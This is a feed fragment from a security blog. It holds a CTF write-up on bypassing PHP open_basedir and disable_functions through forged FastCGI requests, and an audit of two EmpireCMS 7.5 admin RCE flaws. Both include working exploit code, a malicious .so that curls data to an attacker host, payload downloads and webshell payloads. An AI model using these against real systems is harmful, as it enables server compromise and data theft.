alt="image_1dkah71fj1l9u4mu2gfsd2q6d9.png-61.5kB"></p><h3 id="CGI-amp-FastCGI"><a href="#CGI-amp-FastCGI" class="headerlink" title="CGI&amp;FastCGI"></a>CGI&amp;FastCGI</h3><p>CGI（Common Gateway Interface）全称是“通用网关接口”，WEB 服务器与PHP应用进行“交谈”的一种工具。WEB服务器会传哪些数据给PHP解析器呢？URL、查询字符串、POST数据、HTTP header都会有。所以，CGI就是规定要传哪些数据，以什么样的格式传递给后方处理这个请求的协议。</p><p>FastCGI是用来提高CGI程序性能的。类似于CGI，<strong>FastCGI也可以说是一种协议</strong>。简单来说就是CGI的优化：对于CGI来说，每一个Web请求PHP都必须重新解析php.ini、重新载入全部扩展，并重新初始化全部数据结构。而使用FastCGI，所有这些都只在进程启动时发生一次。还有一个额外的好处是，持续数据库连接(Persistent database connection)可以工作。</p><p>FastCGI的工作原理如下：<br><img src="http://static.zybuluo.com/1160307775/9a80mehqfymaajjef8zfagch/image_1dkahc1jogup1l5v1dlr9qe1c1n26.png" alt="image_1dkahc1jogup1l5v1dlr9qe1c1n26.png-88.7kB"></p><p>1、Web Server启动时载入FastCGI进程管理器（Apache Module或IIS ISAPI等)</p><p>2、FastCGI进程管理器自身初始化，启动多个CGI解释器进程(可建多个php-cgi)，并等待来自Web Server的连接。</p><p>3、当客户端请求到达Web Server时，FastCGI进程管理器选择并连接到一个CGI解释器。Web server将CGI环境变量和标准输入发送到FastCGI子进程php-cgi。</p><p>4、FastCGI子进程完成处理后，将标准输出和错误信息从同一连接返回Web Server。当FastCGI子进程关闭连接时，请求便告处理完成。FastCGI子进程接着等待，并处理来自FastCGI进程管理器(运行在Web Server中)的下一个连接。 在CGI模式中，php-cgi在此便退出了。</p><h3 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h3><p>FPM(php-fastcgi program manager)顾名思义，这是一个PHP专用的 fastcgi 管理器。也就是说，PHP-FPM 是对于 FastCGI 协议的具体实现，他负责管理一个进程池，来处理来自Web服务器的请求。目前，PHP5.3版本之后，PHP-FPM是内置于PHP的。因为PHP-CGI只是个CGI程序，他自己本身只能解析请求，返回结果，不会进程管理。所以就出现了一些能够调度 php-cgi 进程的程序，比如说由lighthttpd分离出来的spawn-fcgi。同样，PHP-FPM也是用于调度管理PHP解析器php-cgi的管理程序。</p><h2 id="open-basedir的绕过"><a href="#open-basedir的绕过" class="headerlink" title="open_basedir的绕过"></a>open_basedir的绕过</h2><p>前提是我们能够执行一段php程序来伪造FastCGI.php</p><p>在PHP中：</p><ul><li><p>可以通过在FastCGI协议修改PHP_VALUE字段进而修改php.ini中的一些设置，而open_basedir 同样可以通过此种方法进行设置。比如：<code>$php_value = &quot;open_basedir = /&quot;;</code></p></li><li><p>因为FPM没有判断请求的来源是否必须来自Webserver。根据PHP解析器的流程，我们可以伪造FastCGI向FPM发起请求，PHP_VALUE相当于改变.ini中的设置，覆盖了本身的open_basedir</p></li></ul><h3 id="FastCGI脚本"><a href="#FastCGI脚本" class="headerlink" title="FastCGI脚本"></a>FastCGI脚本</h3><pre><code>&lt;?phpclass TimedOutException extends \Exception {}class ForbiddenException extends \Exception {}class Client {const VERSION_1 = 1;const BEGIN_REQUEST = 1;const ABORT_REQUEST = 2;const END_REQUEST = 3;const PARAMS = 4;const STDIN = 5;const STDOUT = 6;const STDERR = 7;const DATA = 8;const GET_VALUES = 9;const GET_VALUES_RESULT = 10;const UNKNOWN_TYPE = 11;const MAXTYPE = self::UNKNOWN_TYPE;const RESPONDER = 1;const AUTHORIZER = 2;const FILTER = 3;const REQUEST_COMPLETE = 0;const CANT_MPX_CONN = 1;const OVERLOADED = 2;const UNKNOWN_ROLE = 3;const MAX_CONNS = &#39;MAX_CONNS&#39;;const MAX_REQS = &#39;MAX_REQS&#39;;const MPXS_CONNS = &#39;MPXS_CONNS&#39;;const HEADER_LEN = 8;const REQ_STATE_WRITTEN = 1;const REQ_STATE_OK = 2;const REQ_STATE_ERR = 3;const REQ_STATE_TIMED_OUT = 4;private $_sock = null;private $_host = null;private $_port = null;private $_keepAlive = false;private $_requests = array();private $_persistentSocket = false;private $_connectTimeout = 5000;private $_readWriteTimeout = 5000;public function __construct( $host, $port ) {    $this-&gt;_host = $host;    $this-&gt;_port = $port;}public function setKeepAlive( $b ) {          $this-&gt;_keepAlive = (boolean) $b;          if ( ! $this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock ) {              fclose( $this-&gt;_sock );    }}public function getKeepAlive() {    return $this-&gt;_keepAlive;}public function setPersistentSocket( $b ) {          $was_persistent          = ( $this-&gt;_sock &amp;&amp; $this-&gt;_persistentSocket );          $this-&gt;_persistentSocket = (boolean) $b;          if ( ! $this-&gt;_persistentSocket &amp;&amp; $was_persistent ) {              fclose( $this-&gt;_sock );    }}public function getPersistentSocket() {    return $this-&gt;_persistentSocket;}public function setConnectTimeout( $timeoutMs ) {          $this-&gt;_connectTimeout = $timeoutMs;}public function getConnectTimeout() {    return $this-&gt;_connectTimeout;}public function setReadWriteTimeout( $timeoutMs ) {          $this-&gt;_readWriteTimeout = $timeoutMs;          $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );}public function getReadWriteTimeout() {    return $this-&gt;_readWriteTimeout;}private function set_ms_timeout( $timeoutMs ) {          if ( ! $this-&gt;_sock ) {        return false;    }    return stream_set_timeout( $this-&gt;_sock, floor( $timeoutMs / 1000 ), ( $timeoutMs % 1000 ) * 1000 );}private function connect() {    if ( ! $this-&gt;_sock ) {              if ( $this-&gt;_persistentSocket ) {                  $this-&gt;_sock = pfsockopen( $this-&gt;_host, $this-&gt;_port, $errno, $errstr, $this-&gt;_connectTimeout / 1000 );              } else {                  $this-&gt;_sock = fsockopen( $this-&gt;_host, $this-&gt;_port, $errno, $errstr, $this-&gt;_connectTimeout / 1000 );              }              if ( ! $this-&gt;_sock ) {                  throw new \Exception( &#39;Unable to connect to FastCGI application: &#39; . $errstr );              }              if ( ! $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout ) ) {            throw new \Exception( &#39;Unable to set timeout on socket&#39; );        }    }}private function buildPacket( $type, $content, $requestId = 1 ) {          $clen = strlen( $content );    return chr( self::VERSION_1 )         /* version */           . chr( $type )                    /* type */                 . chr( ( $requestId &gt;&gt; 8 ) &amp; 0xFF ) /* requestIdB1 */           . chr( $requestId &amp; 0xFF )        /* requestIdB0 */                 . chr( ( $clen &gt;&gt; 8 ) &amp; 0xFF )     /* contentLengthB1 */           . chr( $clen &amp; 0xFF )             /* contentLengthB0 */                 . chr( 0 )                        /* paddingLength */                 . chr( 0 )                        /* reserved */                 . $content;                     /* content */}private function buildNvpair( $name, $value ) {    $nlen = strlen( $name );    $vlen = strlen( $value );    if ( $nlen &lt; 128 ) {              /* nameLengthB0 */              $nvpair = chr( $nlen );          } else {              /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */              $nvpair = chr( ( $nlen &gt;&gt; 24 ) | 0x80 ) . chr( ( $nlen &gt;&gt; 16 ) &amp; 0xFF ) . chr( ( $nlen &gt;&gt; 8 ) &amp; 0xFF ) . chr( $nlen &amp; 0xFF );          }          if ( $vlen &lt; 128 ) {        /* valueLengthB0 */        $nvpair .= chr( $vlen );    } else {        /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */        $nvpair .= chr( ( $vlen &gt;&gt; 24 ) | 0x80 ) . chr( ( $vlen &gt;&gt; 16 ) &amp; 0xFF ) . chr( ( $vlen &gt;&gt; 8 ) &amp; 0xFF ) . chr( $vlen &amp; 0xFF );    }    /* nameData &amp; valueData */    return $nvpair . $name . $value;}private function readNvpair( $data, $length = null ) {    $array = array();          if ( $length === null ) {        $length = strlen( $data );    }    $p = 0;          while ( $p != $length ) {              $nlen = ord( $data{$p ++} );              if ( $nlen &gt;= 128 ) {                  $nlen = ( $nlen &amp; 0x7F &lt;&lt; 24 );                  $nlen |= ( ord( $data{$p ++} ) &lt;&lt; 16 );                  $nlen |= ( ord( $data{$p ++} ) &lt;&lt; 8 );                  $nlen |= ( ord( $data{$p ++} ) );              }              $vlen = ord( $data{$p ++} );              if ( $vlen &gt;= 128 ) {                  $vlen = ( $nlen &amp; 0x7F &lt;&lt; 24 );                  $vlen |= ( ord( $data{$p ++} ) &lt;&lt; 16 );                  $vlen |= ( ord( $data{$p ++} ) &lt;&lt; 8 );                  $vlen |= ( ord( $data{$p ++} ) );              }              $array[ substr( $data, $p, $nlen ) ] = substr( $data, $p + $nlen, $vlen );              $p                                   += ( $nlen + $vlen );    }    return $array;}private function decodePacketHeader( $data ) {          $ret                  = array();          $ret[&#39;version&#39;]       = ord( $data{0} );          $ret[&#39;type&#39;]          = ord( $data{1} );          $ret[&#39;requestId&#39;]     = ( ord( $data{2} ) &lt;&lt; 8 ) + ord( $data{3} );          $ret[&#39;contentLength&#39;] = ( ord( $data{4} ) &lt;&lt; 8 ) + ord( $data{5} );          $ret[&#39;paddingLength&#39;] = ord( $data{6} );          $ret[&#39;reserved&#39;]      = ord( $data{7} );    return $ret;}private function readPacket() {    if ( $packet = fread( $this-&gt;_sock, self::HEADER_LEN ) ) {        $resp            = $this-&gt;decodePacketHeader( $packet );              $resp[&#39;content&#39;] = &#39;&#39;;        if ( $resp[&#39;contentLength&#39;] ) {                  $len = $resp[&#39;contentLength&#39;];                  while ( $len &amp;&amp; ( $buf = fread( $this-&gt;_sock, $len ) ) !== false ) {                      $len             -= strlen( $buf );                      $resp[&#39;content&#39;] .= $buf;                  }              }              if ( $resp[&#39;paddingLength&#39;] ) {            $buf = fread( $this-&gt;_sock, $resp[&#39;paddingLength&#39;] );        }        return $resp;    } else {        return false;    }}public function getValues( array $requestedInfo ) {          $this-&gt;connect();          $request = &#39;&#39;;          foreach ( $requestedInfo as $info ) {              $request .= $this-&gt;buildNvpair( $info, &#39;&#39; );          }          fwrite( $this-&gt;_sock, $this-&gt;buildPacket( self::GET_VALUES, $request, 0 ) );          $resp = $this-&gt;readPacket();          if ( $resp[&#39;type&#39;] == self::GET_VALUES_RESULT ) {              return $this-&gt;readNvpair( $resp[&#39;content&#39;], $resp[&#39;length&#39;] );    } else {        throw new \Exception( &#39;Unexpected response type, expecting GET_VALUES_RESULT&#39; );    }}public function request( array $params, $stdin ) {    $id = $this-&gt;async_request( $params, $stdin );    return $this-&gt;wait_for_response( $id );}public function async_request( array $params, $stdin ) {    $this-&gt;connect();          // Pick random number between 1 and max 16 bit unsigned int 65535          $id = mt_rand( 1, ( 1 &lt;&lt; 16 ) - 1 );    // Using persistent sockets implies you want them keept alive by server!    $keepAlive     = intval( $this-&gt;_keepAlive || $this-&gt;_persistentSocket );          $request       = $this-&gt;buildPacket( self::BEGIN_REQUEST              , chr( 0 ) . chr( self::RESPONDER ) . chr( $keepAlive ) . str_repeat( chr( 0 ), 5 )        , $id          );          $paramsRequest = &#39;&#39;;    foreach ( $params as $key =&gt; $value ) {              $paramsRequest .= $this-&gt;buildNvpair( $key, $value, $id );          }          if ( $paramsRequest ) {        $request .= $this-&gt;buildPacket( self::PARAMS, $paramsRequest, $id );    }    $request .= $this-&gt;buildPacket( self::PARAMS, &#39;&#39;, $id );          if ( $stdin ) {        $request .= $this-&gt;buildPacket( self::STDIN, $stdin, $id );    }    $request .= $this-&gt;buildPacket( self::STDIN, &#39;&#39;, $id );          if ( fwrite( $this-&gt;_sock, $request ) === false || fflush( $this-&gt;_sock ) === false ) {        $info = stream_get_meta_data( $this-&gt;_sock );        if ( $info[&#39;timed_out&#39;] ) {                  throw new TimedOutException( &#39;Write timed out&#39; );              }              // Broken pipe, tear down so future requests might succeed              fclose( $this-&gt;_sock );        throw new \Exception( &#39;Failed to write request to socket&#39; );    }    $this-&gt;_requests[ $id ] = array(        &#39;state&#39;    =&gt; self::REQ_STATE_WRITTEN,        &#39;response&#39; =&gt; null    );    return $id;}public function wait_for_response( $requestId, $timeoutMs = 0 ) {    if ( ! isset( $this-&gt;_requests[ $requestId ] ) ) {        throw new \Exception( &#39;Invalid request id given&#39; );    }    if ( $this-&gt;_requests[ $requestId ][&#39;state&#39;] == self::REQ_STATE_OK         || $this-&gt;_requests[ $requestId ][&#39;state&#39;] == self::REQ_STATE_ERR    ) {        return $this-&gt;_requests[ $requestId ][&#39;response&#39;];    }    if ( $timeoutMs &gt; 0 ) {              // Reset timeout on socket for now              $this-&gt;set_ms_timeout( $timeoutMs );          } else {              $timeoutMs = $this-&gt;_readWriteTimeout;    }    $startTime = microtime( true );          do {              $resp = $this-&gt;readPacket();              if ( $resp[&#39;type&#39;] == self::STDOUT || $resp[&#39;type&#39;] == self::STDERR ) {                  if ( $resp[&#39;type&#39;] == self::STDERR ) {                      $this-&gt;_requests[ $resp[&#39;requestId&#39;] ][&#39;state&#39;] = self::REQ_STATE_ERR;                  }                  $this-&gt;_requests[ $resp[&#39;requestId&#39;] ][&#39;response&#39;] .= $resp[&#39;content&#39;];              }              if ( $resp[&#39;type&#39;] == self::END_REQUEST ) {                  $this-&gt;_requests[ $resp[&#39;requestId&#39;] ][&#39;state&#39;] = self::REQ_STATE_OK;                  if ( $resp[&#39;requestId&#39;] == $requestId ) {                      break;                  }              }              if ( microtime( true ) - $startTime &gt;= ( $timeoutMs * 1000 ) ) {                  // Reset                  $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );                  throw new \Exception( &#39;Timed out&#39; );              }          } while ( $resp );    if ( ! is_array( $resp ) ) {              $info = stream_get_meta_data( $this-&gt;_sock );              // We must reset timeout but it must be AFTER we get info              $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );              if ( $info[&#39;timed_out&#39;] ) {                  throw new TimedOutException( &#39;Read timed out&#39; );              }              if ( $info[&#39;unread_bytes&#39;] == 0                   &amp;&amp; $info[&#39;blocked&#39;]                   &amp;&amp; $info[&#39;eof&#39;] ) {                  throw new ForbiddenException( &#39;Not in white list. Check listen.allowed_clients.&#39; );              }              throw new \Exception( &#39;Read failed&#39; );          }          // Reset timeout          $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );          switch ( ord( $resp[&#39;content&#39;]{4} ) ) {        case self::CANT_MPX_CONN:            throw new \Exception( &#39;This app can\&#39;t multiplex [CANT_MPX_CONN]&#39; );            break;        case self::OVERLOADED:            throw new \Exception( &#39;New request rejected; too busy [OVERLOADED]&#39; );            break;        case self::UNKNOWN_ROLE:            throw new \Exception( &#39;Role value not known [UNKNOWN_ROLE]&#39; );            break;        case self::REQUEST_COMPLETE:            return $this-&gt;_requests[ $requestId ][&#39;response&#39;];    }}}$client    = new Client(&quot;unix:///tmp/php-cgi.sock&quot;, -1);  $php_value = &quot;open_basedir = /&quot;;$filepath  = &#39;/tmp/readflag.php&#39;;  $content   = &#39;hpdoger&#39;;echo $client-&gt;request(      array(          &#39;GATEWAY_INTERFACE&#39; =&gt; &#39;FastCGI/1.0&#39;,          &#39;REQUEST_METHOD&#39;    =&gt; &#39;POST&#39;,          &#39;SCRIPT_FILENAME&#39;   =&gt; $filepath,    &#39;SERVER_SOFTWARE&#39;   =&gt; &#39;php/fcgiclient&#39;,    &#39;REMOTE_ADDR&#39;       =&gt; &#39;127.0.0.1&#39;,    &#39;REMOTE_PORT&#39;       =&gt; &#39;9985&#39;,    &#39;SERVER_ADDR&#39;       =&gt; &#39;127.0.0.1&#39;,    &#39;SERVER_PORT&#39;       =&gt; &#39;80&#39;,    &#39;SERVER_NAME&#39;       =&gt; &#39;mag-tured&#39;,    &#39;SERVER_PROTOCOL&#39;   =&gt; &#39;HTTP/1.1&#39;,    &#39;CONTENT_TYPE&#39;      =&gt; &#39;application/x-www-form-urlencoded&#39;,    &#39;CONTENT_LENGTH&#39;    =&gt; strlen( $content ),          &#39;PHP_VALUE&#39;         =&gt; $php_value,),$content);</code></pre><h3 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h3><p>回到这个题目，首先我们找到P神有一篇文章<a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="noopener">PHP绕过open_basedir列目录的研究</a></p><p>上传一个php到/tmp下，包含之后列一下根目录存在哪些文件</p><pre><code>copy(&#39;http://vps/log2.txt&#39;,&#39;/tmp/scandir.php&#39;）*lo2.txt*=&gt;&lt;?php$file_list = array();// normal files$it = new DirectoryIterator(&quot;glob:///*&quot;);foreach($it as $f) {    $file_list[] = $f-&gt;__toString();}// special files (starting with a dot(.))$it = new DirectoryIterator(&quot;glob:///.*&quot;);foreach($it as $f) {    $file_list[] = $f-&gt;__toString();}sort($file_list);foreach($file_list as $f){        echo &quot;{$f}&lt;br/&gt;&quot;;}?&gt;</code></pre><p><img src="http://static.zybuluo.com/1160307775/ws7kk6wcaingfbutddk5mbbg/image_1dkalj2gr1c4434273c1geo1a8e64.png" alt="image_1dkalj2gr1c4434273c1geo1a8e64.png-226.6kB"></p><p>使用同样的copy方法上传我们的FastCGI脚本，脚本中<code>php_value</code>的值是我们的FastCGI要传给FPM的值用来修改php.ini，并且根据<code>SCRIPT_FILENAME</code>对php文件进行执行<code>/tmp/readflag.php</code>。</p><p>同时脚本还要修改的地方，就是使用套接字协议去加载socket。Nginx连接fastcgi的方式有2种：TCP和unix domain socket，脚本使用的即第二种形式。根据不同的php版本，找不同的fastcgi的套接字。在0CTF的题目中，大家用的是php7.2默认的FPM套接字<code>/run/php/php7.3-fpm.sock）</code>，其实FastCGI/FPM套接字都可以用，但是php5的默认</p><p>出题人在tmp目录已经给我们FastCGI的套接字<code>/tmp/php-cgi.sock</code>，直接修改脚本</p><pre><code>new Client(&quot;unix:///tmp/php-cgi.sock&quot;, -1)</code></pre><p>同时我们还要上传一个readflag.php文件作为脚本的<code>SCRIPT_FILENAME</code>，这里我让FPM为我们加载这样一个php脚本，成功读到readflag程序。但此时我们仍需要bypass disable_functions</p><pre><code>&lt;?phpvar_dump(file_get_contents(&#39;/readflag&#39;));</code></pre><p><img src="http://static.zybuluo.com/1160307775/xvn7wtzdhnp9r0ouipcrcdbq/image_1dkaqauqt1pud86t1j5rqei74f7e.png" alt="image_1dkaqauqt1pud86t1j5rqei74f7e.png-406.1kB"></p><h2 id="Disable-functions的绕过"><a href="#Disable-functions的绕过" class="headerlink" title="Disable_functions的绕过"></a>Disable_functions的绕过</h2><h3 id="FastCGI加载so"><a href="#FastCGI加载so" class="headerlink" title="FastCGI加载so"></a>FastCGI加载so</h3><p>看了下Disable_functions留给我们的有putenv()</p><p>关于LD_PRELOAD与putenv也就不过多介绍了，飘零师傅文章写的很详细。大意就是把恶意的so文件加载到环境变量中去执行，而so是我们编译出来的c文件，包含rce的语句，这也是当时0CTF的解题思路。</p><p>不过在这道题中，没有安装Imagick，也没有mail函数。但是还有一个函数也会调用sendmail去开进程-&gt;error_log，后面会复现一下error_log的做法。</p><p>那么既然putenv()+函数是把so文件加载到环境变量中再去调用，那么我们fastcgi也完全可以做同样的事，只需要更改一下上面脚本的      <code>php_value</code>给ini添加一个extender就行了</p><pre><code> $php_value = &quot;allow_url_include = On\nsafe_mode = Off\nopen_basedir = /\nextension_dir = /tmp\nextension = hpdoger.so\n</code></pre><p>编译一个恶意的c文件<code>hpdoger.c</code>，这里直接用网上亘古不变的写法</p><pre><code>#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;__attribute__ ((__constructor__)) void preload (void){    system(&quot;curl vps:6666/`/readflag`&quot;);}</code></pre><p>通过shared命令编译<code>gcc hpdoger.c -fPIC -shared -o hpdoger.so</code>，依然是通过copy命令上传fastcgi.php和hpdoger.so，此时/tmp下应该有这两个文件</p><pre><code>copy(&#39;http://vps/hpdoger.so&#39;,&#39;/tmp/hpdoger.so&#39;)</code></pre><p><img src="http://static.zybuluo.com/1160307775/jov8ot2pbsbpyzpaoft92is2/image_1dkatupe71fhkrvopqi1s0a1v5nm.png" alt="image_1dkatupe71fhkrvopqi1s0a1v5nm.png-272kB"></p><p>直接包含fastcgi就能加载并调用hpdoger.so-&gt;bypass base_opendir-&gt;rce</p><pre><code>find=.*/e%00&amp;replace=include(&#39;/tmp/fastcgi.php&#39;)&amp;id=4184&amp;regex=1`</code></pre><p><img src="http://static.zybuluo.com/1160307775/i53w4nd8brbyxs76jmx8bywu/image_1dkatnc0vgq56a717rh1dff1u7s9.png" alt="image_1dkatnc0vgq56a717rh1dff1u7s9.png-78.4kB"></p><h3 id="LD-PRELOAD加载so"><a href="#LD-PRELOAD加载so" class="headerlink" title="LD_PRELOAD加载so"></a>LD_PRELOAD加载so</h3><p>前文提到mail被Disable_functions了，但是mail和error_log都调用了外部进程sendmail。这里编写一个php来调用error_log，然后代码执行包含这个/tmp下的php即可rce</p><pre><code>&lt;?phpputenv(&quot;LD_PRELOAD=/tmp/hpdoger.so&quot;);error_log(&#39;&#39;,1);?&gt;</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>自闭点在于本地环境和远程环境真的是两个概念，mac环境gcc编译和ubuntu的gcc编译出来的东西天壤之别..</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;从一道CTF学习Fastcgi绕过姿势&quot;&gt;&lt;a href=&quot;#从一道CTF学习Fastcgi绕过姿势&quot; class=&quot;headerlink&quot; title=&quot;从一道CTF学习Fastcgi绕过姿势&quot;&gt;&lt;/a&gt;从一道CTF学习Fastcgi绕过姿势&lt;/h1&gt;&lt;p&gt;原文
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://hpdoger.cn/tags/CTF/"/>
    
      <category term="Web" scheme="https://hpdoger.cn/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>帝国(EmpireCMS)7.5的两个后台RCE审计</title>
    <link href="https://hpdoger.cn/2019/09/09/%E5%B8%9D%E5%9B%BD(EmpireCMS)7.5%E7%9A%84%E4%B8%A4%E4%B8%AA%E5%90%8E%E5%8F%B0RCE%E5%AE%A1%E8%AE%A1/"/>
    <id>https://hpdoger.cn/2019/09/09/帝国(EmpireCMS)7.5的两个后台RCE审计/</id>
    <published>2019-09-08T16:00:00.000Z</published>
    <updated>2019-09-11T02:50:37.101Z</updated>
    
    <content type="html"><![CDATA[<h1 id="帝国-EmpireCMS-7-5的两个后台RCE审计"><a href="#帝国-EmpireCMS-7-5的两个后台RCE审计" class="headerlink" title="帝国(EmpireCMS)7.5的两个后台RCE审计"></a>帝国(EmpireCMS)7.5的两个后台RCE审计</h1><p>原文首发于先知：<a href="https://xz.aliyun.com/t/6228" target="_blank" rel="noopener">https://xz.aliyun.com/t/6228</a></p><h2 id="后台RCE-增加自定义页面"><a href="#后台RCE-增加自定义页面" class="headerlink" title="后台RCE-增加自定义页面"></a>后台RCE-增加自定义页面</h2><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>这个漏洞挖掘最初来源于qclover师傅:<a href="http://qclover.cn/2018/10/10/EmpireCMS_V7.5%E7%9A%84%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1.html" target="_blank" rel="noopener">EmpireCMS_V7.5的一次审计</a></p><p>但是在这篇复现的文章中还是有一些出入的地方，比如说getshell的具体位置和成因。这里重新跟进分析一下</p><p>首先看一下getshell的流程，这个洞有点像黑盒to白盒<br><img src="http://static.zybuluo.com/1160307775/2r4ccien35hlqw77mo8hrqzj/image_1dje3gco735q1k5m1f11n071a634r.png" alt="image_1dje3gco735q1k5m1f11n071a634r.png-328kB"></p><p>增加页面功能，会在程序根目录生成一个shell.php，访问为phpinfo结果<br><img src="http://static.zybuluo.com/1160307775/2zfoc03cbjv8woa3r5gjme49/image_1djdll0r410dk6ktm7stsgrlm.png" alt="image_1djdll0r410dk6ktm7stsgrlm.png-248.3kB"></p><p>但是在我写入其他木马时，例如<code>&lt;?php @eval($_REQUEST[hpdoger]);?&gt;</code>，根目录却生成了一个空的shell.php文件<br><img src="http://static.zybuluo.com/1160307775/48t49l1j0m30otcu25f646zv/image_1djdlqbum1gj217cp2d61d5f1hi613.png" alt="image_1djdlqbum1gj217cp2d61d5f1hi613.png-56.4kB"></p><p>此时就有些疑问，推测真正的漏洞点应该不是在根目录写入一个php，应该另有它径，这里分析一下漏洞产生的真正成因。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>入口在<code>e/admin/ecmscom.php</code>代码48行，跟进函数<code>AddUserpage</code><br><img src="http://static.zybuluo.com/1160307775/zdc2rmjeup4qfnqr5u9agc3j/image_1djdm53uj1m201n781ncr7ednrr1g.png" alt="image_1djdm53uj1m201n781ncr7ednrr1g.png-431.1kB"></p><p>重点关注两个参数的流程:path、pagetext<br><img src="http://static.zybuluo.com/1160307775/w2r7bolvqfafnju4ndirh0al/image_1djdm8m8l6ve645da3es96c51t.png" alt="image_1djdm8m8l6ve645da3es96c51t.png-535.4kB"></p><p>步入<code>RepPhpAspJspcode</code>函数</p><pre><code>function RepPhpAspJspcode($string){    global $public_r;    if(!$public_r[candocode]){        //$string=str_replace(&quot;&lt;?xml&quot;,&quot;[!--ecms.xml--]&quot;,$string);        $string=str_replace(&quot;&lt;\\&quot;,&quot;&amp;lt;\\&quot;,$string);        $string=str_replace(&quot;\\&gt;&quot;,&quot;\\&amp;gt;&quot;,$string);        $string=str_replace(&quot;&lt;?&quot;,&quot;&amp;lt;?&quot;,$string);        $string=str_replace(&quot;&lt;%&quot;,&quot;&amp;lt;%&quot;,$string);        if(@stristr($string,&#39; language&#39;))        {            $string=preg_replace(array(&#39;!&lt;script!i&#39;,&#39;!&lt;/script&gt;!i&#39;),array(&#39;&amp;lt;script&#39;,&#39;&amp;lt;/script&amp;gt;&#39;),$string);        }        //$string=str_replace(&quot;[!--ecms.xml--]&quot;,&quot;&lt;?xml&quot;,$string);    }    return $string;}</code></pre><p>这个函数用来对pagetext参数进行了php标签的实体化，但是empirecms默认<code>public_r[candocode]</code>为null，所以这里相当于直接返回了原始pagetext的值</p><p>继续回到<code>AddUserpage</code>函数，接着步入<code>ReUserpage</code>函数，在e/class/functions.php的4281行<br><img src="http://static.zybuluo.com/1160307775/gyn1d0txofybrwzm1hu39r1a/image_1djdmv7bv17551oir15kv1do5sg42a.png" alt="image_1djdmv7bv17551oir15kv1do5sg42a.png-298.8kB"></p><p>获取程序的根路径后拼接传入的path，而后DoFileMKDir在根目录建立了shell.php</p><p>接着步入<code>InfoNewsBq</code>函数，也是这个漏洞产生的函数。关键代码在<code>e/class/functions.php</code>的2469-2496行</p><p><img src="http://static.zybuluo.com/1160307775/i3ri8ea5z4g4leh18tid1gig/image_1djdnbjo2pelbn91uh11ks21u8p2n.png" alt="image_1djdnbjo2pelbn91uh11ks21u8p2n.png-496.3kB"></p><p>$file参数以php结尾，通过<code>WriteFiletext</code>函数向$file中写入上一步的pagetext(这里为$indextext)，而<code>WriteFiletext</code>是没有任何过滤的</p><pre><code>function WriteFiletext($filepath,$string){    global $public_r;    $string=stripSlashes($string);    $fp=@fopen($filepath,&quot;w&quot;);    @fputs($fp,$string);    @fclose($fp);    if(empty($public_r[filechmod]))    {        @chmod($filepath,0777);    }}</code></pre><p>于是在<code>e/data/tmp</code>目录下，以模版文件的形式写入webshell，同时也将AddCheckViewTempCode()返回的权鉴方法写了进去，所以我们不能直接以url的方式访问这个webshell。<br><img src="http://static.zybuluo.com/1160307775/zp17zrn2j1muego2qa7p9din/image_1djdo4l1d1gte63t1qcb1a73aho4e.png" alt="image_1djdo4l1d1gte63t1qcb1a73aho4e.png-278.6kB"></p><p>但是仍有方法使这个webshell执行并将结果输出。原因在下面这几行<br><img src="http://static.zybuluo.com/1160307775/ecp2rqbzer4w4xk8lw33ghcz/image_1djdnjf5p1b2p1oan4pqn7bd2434.png" alt="image_1djdnjf5p1b2p1oan4pqn7bd2434.png-564.3kB"></p><p>由于入口处定义了常量<code>InEmpireCMS</code>，ob_get_contents可以读取缓冲区的输出，而输出正好是刚才我们包含进去的shell的结果。因此执行了phpinfo()后将要输出到浏览器的内容赋值给了$string变量并返回，在<code>ReUserpage</code>函数中又进行了一次写入，缓冲结果写入的根目录下的shell.php，造成一个表面getshell的现象，其实是一种rce。</p><p><img src="http://static.zybuluo.com/1160307775/ceu2e6w6h3a09qkm8krde4sx/image_1djdnpbbj180fdns1d2h1bvd1neu3h.png" alt="image_1djdnpbbj180fdns1d2h1bvd1neu3h.png-355.3kB"></p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>设置<code>$public_r[candocode]</code>为true进行写入内容的过滤</p><h2 id="后台首页模版处rce到getshell"><a href="#后台首页模版处rce到getshell" class="headerlink" title="后台首页模版处rce到getshell"></a>后台首页模版处rce到getshell</h2><p>承接上一个漏洞，整个empirecms不少用到ob_get_contents的地方，所以就想挖掘一下还有没有其他可以利用的点，最后把眼光锁在增加模版处。</p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>在后台模版功能处，选择管理首页模版，然后点击增加首页方案<br><img src="http://static.zybuluo.com/1160307775/92bdlk6m16ygken7p4xw18dj/image_1djp1p7ed1g6q1vs61qof19pb7cjm.png" alt="image_1djp1p7ed1g6q1vs61qof19pb7cjm.png-226.2kB"></p><p>复制下面的payload，填写到模版内容处，点击提交。</p><pre><code>&lt;?php $aa = base64_decode(ZWNobyAnPD9waHAgZXZhbCgkX1JFUVVFU1RbaHBdKTsnPnNoZWxsLnBocA);${(system)($aa)};?&gt;</code></pre><p><img 